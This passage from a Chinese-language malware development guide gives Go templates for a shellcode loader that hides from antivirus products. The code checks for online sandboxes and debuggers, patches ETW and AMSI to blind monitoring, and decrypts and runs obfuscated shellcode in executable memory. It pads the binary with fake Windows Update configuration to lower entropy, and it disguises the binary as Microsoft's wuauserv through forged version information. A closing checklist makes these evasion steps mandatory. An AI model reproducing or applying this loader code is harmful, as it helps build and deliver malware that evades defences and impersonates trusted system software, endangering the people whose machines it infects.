Log Path: C:\Windows\Logs\WindowsUpdate
Cache Path: C:\Windows\Temp
Data Path: C:\ProgramData\Microsoft\Windows
`

    // 低熵字符串2：伪配置信息（约2KB）
    entropyData2 = `
[Configuration]
ServiceName=wuauserv
DisplayName=Windows Update
Description=Enables the detection, download, and installation of updates for Windows and other programs.
StartupType=Automatic
ErrorControl=Normal
ServiceType=Share Process
BinaryPath=C:\Windows\System32\svchost.exe -k netsvcs
Dependencies=rpcss
ServiceSidType=Unrestricted
RequiredPrivileges=SeCreateGlobalPrivilege,SeImpersonatePrivilege,SeIncreaseQuotaPrivilege
FailureActions=Restart/Restart/None
ResetPeriod=86400
RestartDelay=60000
RestartDelay2=120000
ActionDelay=0
ActionDelay2=60000
FailureFlag=0

[Settings]
AutoUpdate=Enabled
InstallDay=EveryDay
InstallTime=03:00
DetectionFrequency=22
DetectionFrequencyEnabled=Yes
RebootRelaunchTimeout=240
RebootRelaunchTimeoutEnabled=Yes
RebootWarningTimeout=30
RebootWarningTimeoutEnabled=Yes
RebootPromptTimeout=15
RebootPromptTimeoutEnabled=Yes
NoAUShutdownTimeout=5
NoAUShutdownTimeoutEnabled=Yes
UseWUServer=No
WUServer=https://update.microsoft.com
WUStatusServer=https://update.microsoft.com
ElevateNonAdmins=Yes

[Logging]
LogLevel=Information
LogPath=C:\Windows\Logs\WindowsUpdate
LogMaxSize=10MB
LogRetention=30days
LogFormat=JSON
LogCompression=Enabled
LogEncryption=None
LogRotation=Daily
LogArchive=Enabled
`

    // 低熵字符串3：伪XML配置（约1KB）
    entropyData3 = `
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <appSettings>
    <add key="ServiceName" value="wuauserv" />
    <add key="DisplayName" value="Windows Update" />
    <add key="Version" value="10.0.19041.1" />
    <add key="Architecture" value="x64" />
    <add key="Language" value="en-US" />
    <add key="AutoUpdate" value="Enabled" />
    <add key="DetectionFrequency" value="22" />
    <add key="InstallTime" value="03:00" />
    <add key="RebootDelay" value="60000" />
    <add key="LogPath" value="C:\Windows\Logs\WindowsUpdate" />
    <add key="LogMaxSize" value="10485760" />
    <add key="CachePath" value="C:\Windows\Temp" />
    <add key="UpdateServer" value="https://update.microsoft.com" />
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
  </startup>
</configuration>
`

    // 低熵字符串4：伪JSON配置（约1KB）
    entropyData4 = `
{
  "service": {
    "name": "wuauserv",
    "display_name": "Windows Update",
    "version": "10.0.19041.1",
    "architecture": "x64",
    "status": "running",
    "startup_type": "automatic"
  },
  "update": {
    "server": "https://update.microsoft.com",
    "frequency": 22,
    "install_time": "03:00",
    "reboot_delay": 60000,
    "auto_install": true,
    "download_priority": "normal"
  },
  "logging": {
    "level": "information",
    "path": "C:\\Windows\\Logs\\WindowsUpdate",
    "max_size": 10485760,
    "retention": 30,
    "format": "json",
    "compression": true
  },
  "cache": {
    "path": "C:\\Windows\\Temp",
    "max_size": 524288000,
    "cleanup_interval": 86400
  }
}
`

    // 低熵字符串5：伪日志模板（约1KB）
    entropyData5 = `
2024-04-24T00:00:00.000Z [INFO] Windows Update Service started
2024-04-24T00:00:01.000Z [INFO] Detecting available updates
2024-04-24T00:00:02.000Z [INFO] Connecting to update server: https://update.microsoft.com
2024-04-24T00:00:03.000Z [INFO] Checking for updates
2024-04-24T00:00:04.000Z [INFO] No updates available
2024-04-24T00:00:05.000Z [INFO] Service status: running
2024-04-24T00:00:06.000Z [INFO] Next check scheduled: 2024-04-25T00:00:00.000Z
2024-04-24T00:00:07.000Z [INFO] Configuration loaded successfully
2024-04-24T00:00:08.000Z [INFO] Cache directory verified: C:\Windows\Temp
2024-04-24T00:00:09.000Z [INFO] Log directory verified: C:\Windows\Logs\WindowsUpdate
`

    // 低熵字节填充（约4KB零字节）
    entropyPadding1 = [4096]byte{} // 全零，熵值最低
    
    // 低熵字节填充（重复模式，约2KB）
    entropyPadding2 [2048]byte = func() [2048]byte {
        var arr [2048]byte
        for i := 0; i < 2048; i++ {
            arr[i] = byte(i % 10) // 只使用0-9共10种字节
        }
        return arr
    }()
)

// 强制使用熵值数据（防止编译器优化删除）
func forceEntropyUsage() {
    // 创建指针确保不被优化
    _ = unsafe.StringData(entropyData1)
    _ = unsafe.StringData(entropyData2)
    _ = unsafe.StringData(entropyData3)
    _ = unsafe.StringData(entropyData4)
    _ = unsafe.StringData(entropyData5)
    _ = &entropyPadding1
    _ = &entropyPadding2
    
    // 输出提示（可选）
    // fmt.Println("Entropy data loaded:", len(entropyData1)+len(entropyData2)+...)
}
```

---

## v3.0 新增：QVM对抗技术

### 360 QVM引擎对抗

**360 QVM（Qihoo Virtual Machine）检测原理：**
- 虚拟沙箱中执行样本
- 监控API调用序列
- 分析内存行为模式
- 检测网络连接行为

### QVM对抗代码模板（必须嵌入）

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
    "time"
)

// ========== QVM对抗技术（必须） ==========

// 沙箱检测函数（仅检测在线沙箱路径，不检测VMware/VirtualBox）
func detectSandbox() bool {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    // 检测1：微步沙箱特征路径（关键检测）
    sandboxPaths := []string{
        "C:\\sample",           // 微步沙箱样本路径
        "C:\\malware",          // 沙箱恶意软件路径
        "C:\\temp\\sample",     // 临时样本路径
        "C:\\analysis",         // 分析路径
        "C:\\sandbox",          // 沙箱路径
        "C:\\virus",            // 病毒分析路径
    }
    
    GetCurrentDirectoryW := kernel32.NewProc("GetCurrentDirectoryW")
    var currentDir [260]uint16
    GetCurrentDirectoryW.Call(260, uintptr(unsafe.Pointer(&currentDir[0])))
    
    currentPath := syscall.UTF16ToString(currentDir[:])
    for _, path := range sandboxPaths {
        if currentPath == path {
            return true // 检测到在线沙箱
        }
    }
    
    // 检测2：分析工具进程（仅检测调试器，不检测VMware/VBox）
    analysisTools := []string{
        "procmon.exe",          // ProcessMonitor
        "procexp.exe",          // ProcessExplorer
        "ollydbg.exe",          // OllyDbg
        "x64dbg.exe",           // x64dbg
        "ida.exe",              // IDA Pro
        "ida64.exe",            // IDA Pro 64
        "windbg.exe",           // WinDbg
    }
    
    CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    Process32FirstW := kernel32.NewProc("Process32FirstW")
    Process32NextW := kernel32.NewProc("Process32NextW")
    CloseHandle := kernel32.NewProc("CloseHandle")
    
    snapshot, _, _ := CreateToolhelp32Snapshot.Call(0x2, 0) // TH32CS_SNAPPROCESS
    
    var pe PROCESSENTRY32W
    pe.Size = uint32(unsafe.Sizeof(pe))
    
    Process32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
    
    for {
        processName := syscall.UTF16ToString(pe.ExeFile[:])
        for _, tool := range analysisTools {
            if processName == tool {
                CloseHandle.Call(snapshot)
                return true // 检测到调试器
            }
        }
        
        ret, _, _ := Process32NextW.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
        if ret == 0 {
            break
        }
    }
    
    CloseHandle.Call(snapshot)
    
    // 注意：不检测VMware/VirtualBox，虚拟机可正常运行
    // 注意：不检测单核CPU，避免误判
    
    return false
}

// 行为延迟启动（规避QVM监控）
func delayedStartup() {
    // QVM沙箱监控时间有限（通常30秒）
    // 短延迟启动可以让沙箱超时，同时不影响虚拟机测试体验
    
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    Sleep := kernel32.NewProc("Sleep")
    
    // 短延迟1-3秒（适合虚拟机测试）
    delaySeconds := 1 + (time.Now().Unix() % 3)
    Sleep.Call(uintptr(delaySeconds * 1000))
    
    // 环境检测
    if detectSandbox() {
        // 检测到沙箱，执行无害操作
        performHarmlessActivity()
        return
    }
}

// 无害活动（沙箱中执行）
func performHarmlessActivity() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    // 执行无害API调用
    GetTickCount := kernel32.NewProc("GetTickCount")
    GetSystemTime := kernel32.NewProc("GetSystemTime")
    GetLocalTime := kernel32.NewProc("GetLocalTime")
    
    var sysTime SYSTEMTIME
    GetSystemTime.Call(uintptr(unsafe.Pointer(&sysTime)))
    GetLocalTime.Call(uintptr(unsafe.Pointer(&sysTime)))
    GetTickCount.Call()
    
    // 短暂等待后退出（适合虚拟机测试）
    time.Sleep(3 * time.Second)
}

// 系统信息结构
type SYSTEM_INFO struct {
    ProcessorArchitecture     uint16
    Reserved                  uint16
    PageSize                  uint32
    MinimumApplicationAddress uintptr
    MaximumApplicationAddress uintptr
    ActiveProcessorMask       uintptr
    NumberOfProcessors        uint32
    ProcessorType             uint32
    AllocationGranularity     uint32
    ProcessorLevel            uint16
    ProcessorRevision         uint16
}

type SYSTEMTIME struct {
    Year         uint16
    Month        uint16
    DayOfWeek    uint16
    Day          uint16
    Hour         uint16
    Minute       uint16
    Second       uint16
    Milliseconds uint16
}

type PROCESSENTRY32W struct {
    Size          uint32
    UsageCount    uint32
    ProcessID     uint32
    DefaultHeapID uintptr
    ModuleID      uint32
    Threads       uint32
    ParentProcessID uint32
    PriClassBase  int32
    Flags         uint32
    ExeFile       [260]uint16
}
```

---

## v3.0 新增：完整增强Loader模板

### 模板1：本地执行增强版

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
    "time"
)

// ========== 版本信息嵌入（必须） ==========
var (
    _companyName     = "Microsoft Corporation"
    _fileDescription = "Windows Update Service"
    _fileVersion     = "10.0.19041.1"
    _internalName    = "wuauserv"
    _legalCopyright  = "Copyright (C) Microsoft Corp."
    _originalFilename = "wuauserv.exe"
    _productName     = "Windows Update"
    _productVersion  = "10.0.19041.1"
    
    // 低熵数据（必须）
    _configData     = `[Settings] Server=https://update.microsoft.com Interval=3600 Retry=3 Timeout=30 LogLevel=Info CachePath=C:\Windows\Temp MaxSize=100MB Compression=Enabled`
    _logTemplate    = `[Log] Level=Information Format=JSON Output=File Path=C:\Windows\Logs\WindowsUpdate MaxSize=10MB Rotation=Daily Retention=30days`
    _copyrightText  = `Microsoft Windows Update Service Copyright (C) Microsoft Corporation. All rights reserved. Licensed under the MIT License.`
    _entropyPadding = [4096]byte{}
)

func init() {
    // 强制使用熵值数据
    _ = &_entropyPadding
}

func main() {
    // ========== 第1步：隐藏窗口（可选） ==========
    hideConsole()
    
    // ========== 第2步：行为延迟启动（QVM对抗，可选） ==========
    if detectSandbox() {
        performHarmlessActivity()
        return // 沙箱中退出
    }
    delayedStartup() // 短延迟1-3秒
    
    // ========== 第3步：ETW/AMSI绕过（必须，最先执行） ==========
    bypassETW()    // 禁用ETW事件追踪
    bypassAMSI()   // 禁用AMSI内存扫描
    
    // ========== 第4步：NTDLL脱钩（必须） ==========
    unhookNTDLL()
    
    // ========== 第5步：解密shellcode ==========
    encrypted := deobfuscateIPv4(ipv4Array)
    shellcode := xorDecrypt(encrypted, xorKey1, xorKey2)
    
    // ========== 第6步：分配内存 + 复制 ==========
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    
    // ========== 第7步：创建线程执行 ==========
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
    
    // ========== 第8步：内存加密保护（必须） ==========
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    var oldProtect uint32
    
    // 加密内存
    xorEncryptMemory(addr, uintptr(len(shellcode)), protectKey)
    
    // 设置PAGE_NOACCESS
    VirtualProtect.Call(addr, uintptr(len(shellcode)), 0x01, uintptr(unsafe.Pointer(&oldProtect)))
}

// ========== 辅助函数 ==========

func hideConsole() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    GetConsoleWindow := kernel32.NewProc("GetConsoleWindow")
    user32 := windows.NewLazySystemDLL("user32.dll")
    ShowWindow := user32.NewProc("ShowWindow")
    
    hwnd, _, _ := GetConsoleWindow.Call()
    ShowWindow.Call(hwnd, 0) // SW_HIDE
}

func bypassETW() {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    EtwEventWrite := ntdll.NewProc("EtwEventWrite")
    
    patch := []byte{0xC3} // ret
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(EtwEventWrite.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
    writeMemory(EtwEventWrite.Addr(), patch)
    VirtualProtect.Call(EtwEventWrite.Addr(), 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func bypassAMSI() {
    amsi := windows.NewLazySystemDLL("amsi.dll")
    AmsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
    
    if AmsiScanBuffer.Addr() == 0 {
        return
    }
    
    patch := []byte{0x48, 0x31, 0xC0, 0xC3} // xor rax, rax; ret
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(AmsiScanBuffer.Addr(), 4, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
    writeMemory(AmsiScanBuffer.Addr(), patch)
    VirtualProtect.Call(AmsiScanBuffer.Addr(), 4, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func unhookNTDLL() {
    // 实现见 ntdll_unhook.md
}

func writeMemory(addr uintptr, data []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)))
}

func xorEncryptMemory(addr uintptr, size uintptr, key []byte) {
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key[i%uintptr(len(key))]
    }
}

// 沙箱检测函数见上方"QVM对抗技术"章节
```

### 模板2：远程注入增强版

远程注入版本需额外添加：
- 参数欺骗（必须）
- BlockDLLs（必须）
- PPID欺骗（推荐）
- 模块踩踏（必须）

实现见 `advanced_process_manipulation.md`

---

## v3.0 新增：编译输出验证

### 熵值验证

**编译完成后必须验证熵值：**

```bash
# 使用Python验证熵值
python -c "
import math
import sys

def entropy(data):
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    size = len(data)
    return -sum(p/size * math.log2(p/size) for p in freq.values())

data = open(sys.argv[1], 'rb').read()
ent = entropy(data)
print(f'Entropy: {ent:.2f}')
if ent > 6:
    print('WARNING: Entropy too high! Need more low-entropy data.')
else:
    print('OK: Entropy within safe range.')
" output.exe

# 目标：Entropy ≤ 6
```

### 导入表验证

**检查导入表是否包含无害API：**

```bash
# 使用pestudio检查导入表
# 或使用Python解析PE导入表

# 目标：
# 1. 敏感API（VirtualAlloc/CreateThread）不直接出现在导入表
# 2. 导入表中包含大量无害API（GetTickCount, GetSystemTime等）
# 3. 无害API数量 ≥ 敏感API数量（通过PEB Walk动态获取）
```

---

## v3.0 总结：强制技术清单

**每个Loader必须应用的技术（不可跳过）：**

| 序号 | 技术 | 文件位置 | 优先级 | 说明 |
|------|------|----------|--------|------|
| 1 | ETW绕过 | main第2行 | P0 | 必须 |
| 2 | AMSI绕过 | main第3行 | P0 | 必须 |
| 3 | 行为延迟启动 | main第4-5行 | P1 | 可选，短延迟1-3秒 |
| 4 | 沙箱检测 | detectSandbox() | P1 | 只检测在线沙箱路径，不检测VMware/VBox |
| 5 | NTDLL脱钩 | unhookNTDLL() | P2 | 推荐 |
| 6 | 版本信息嵌入 | Go代码顶部 | P0 | 必须 |
| 7 | 低熵数据嵌入 | Go代码顶部 | P0 | 必须 |
| 8 | 无害API导入 | initHarmlessAPIs() | P0 | 必须 |
| 9 | 内存加密保护 | 执行后加密 | P2 | 推荐 |

**应用顺序：**
```
代码生成：版本信息 + 低熵数据 + 无害API → loader.go
编译流程：gobuildfuzz fuzz编译 → output.exe（自动应用优化参数）
运行时执行：隐藏窗口 → 延迟启动(可选) → 沙箱检测(仅在线沙箱) → ETW/AMSI → NTDLL脱钩 → shellcode → 内存保护
```

